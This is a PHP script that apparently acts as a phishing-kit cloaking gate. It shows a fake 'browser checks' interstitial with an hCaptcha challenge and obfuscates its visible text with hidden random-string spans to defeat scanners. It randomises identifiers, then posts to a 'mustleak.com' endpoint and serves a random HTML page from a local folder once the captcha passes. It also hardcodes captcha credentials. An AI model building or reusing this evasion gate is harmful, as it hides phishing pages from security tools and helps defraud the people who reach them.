<?php


$hCaptchaKey = "bdd41b85-712f-4909-9a8e-31b11e8a40f7";  //a0577183-72dc-4028-a7d0-db97eb27cb2f
$hCaptchaSecret = "ES_5e9f7f94515f47edbac7097c31f4eeb7";
$hostedDomain = "https://test.mustleak.com/work/rrr/";


function genRan()
{
    $length = rand(8, 50);
    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $random_string = '';
    for ($i = 0; $i < $length; $i++) {
        $random_string .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $random_string;
}


function sendPostRequest($url, $data, $headers)
{
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}


$trash_string = genRan();
$successCallback = genRan();
$errorCallback = genRan();
$formP = genRan();

function hcaptcha($hCaptchaKey, $hostedDomain, $formP, $trash_string, $errorCallback, $successCallback)
{

    $cap = <<<cap


<!DOCTYPE html>
<html lang="en">
<head><title>$trash_string</title>
    <meta charset="UTF-8">
    <meta name="lang" content="en">
    <meta name="viewport" content="width=device-width, initial-scale=1">
     <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">   
       <style>.$trash_string {
        position: absolute;
        left: -9999px;
    }</style>
</head>
<body>
<div class="container mt-5">
    <div class="d-flex justify-content-center ">
        <div class="text-center"><span class="fs-5">J<span class="$trash_string">$trash_string</span>us<span class="$trash_string">$trash_string</span>t a m<span
                class="$trash_string">$trash_string</span>om<span
                class="$trash_string">$trash_string</span>e<span class="$trash_string">$trash_string</span>nt,</span>
            <div class="mt-2">
                <form action="$formP"><span class="h-captcha" data-sitekey="$hCaptchaKey" data-callback="$successCallback"
                                                                data-error-callback="$errorCallback"></span></form>
          </div>
            <div class="mt-2 text-muted" style="font-size: 14px;">T<span class="$trash_string">$trash_string</span>hi<span class="$trash_string">$trash_string</span>s
                pa<span class="$trash_string">$trash_string</span>ge is r<span
                        class="$trash_string">$trash_string</span>un<span class="$trash_string">$trash_string</span>ni<span
                        class="$trash_string">$trash_string</span>ng br<span class="$trash_string">$trash_string</span>ow<span
                        class="$trash_string">$trash_string</span>se<span class="$trash_string">$trash_string</span>r c<span
                        class="$trash_string">$trash_string</span>he<span class="$trash_string">$trash_string</span>ck<span
                        class="$trash_string">$trash_string</span>s
                to e<span class="$trash_string">$trash_string</span>ns<span class="$trash_string">$trash_string</span>ur<span
                        class="$trash_string">$trash_string</span>e y<span
                        class="$trash_string">$trash_string</span>ou<span class="$trash_string">$trash_string</span>r s<span class="$trash_string">$trash_string</span>ec<span
                        class="$trash_string">$trash_string</span>ur<span
                        class="$trash_string">$trash_string</span>it<span class="$trash_string">$trash_string</span>y.
            </div>
        </div>
    </div>
</div>
<script>

function $errorCallback() {
   hcaptcha.reset()
}

function $successCallback() {
    var $formP = document.forms[0];
    $formP.onsubmit = function ($formP) {
        $formP.preventDefault();
    };
   
   
    fetch("$hostedDomain", {
    method: "POST",
    body: new FormData($formP)
}).then(response => {
    return response.text();
}).then(data => {
    document.write(data);
});

}

</script>
</body>
</html>


cap;
    return $cap;
}


if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    if (isset($_POST["h-captcha-response"]) && $hCaptchaKey && $hCaptchaSecret) {
        $hcapData = array(
            "secret" => $hCaptchaSecret,
            "response" => $_POST["h-captcha-response"],
        );


        $h_header = array(
            "Content-Type: multipart/form-data",
        );

        $verifyCaptcha = sendPostRequest("https://hcaptcha.com/siteverify", $hcapData, $h_header);
        $responseData = json_decode($verifyCaptcha, true);

        if ($responseData && isset($responseData['success']) && $responseData['success'] === true) {
            $folder = 'html_files';
            $html_files = glob($folder . '/*.html');
            $random_file = $html_files[array_rand($html_files)];
            if (file_exists($random_file)) {
                $html_content = file_get_contents($random_file);
                echo $html_content;
                exit();
            }
        } else {
            echo"";
            exit();

        }

    }

}


echo hcaptcha($hCaptchaKey, $hostedDomain, $formP, $trash_string, $errorCallback, $successCallback);








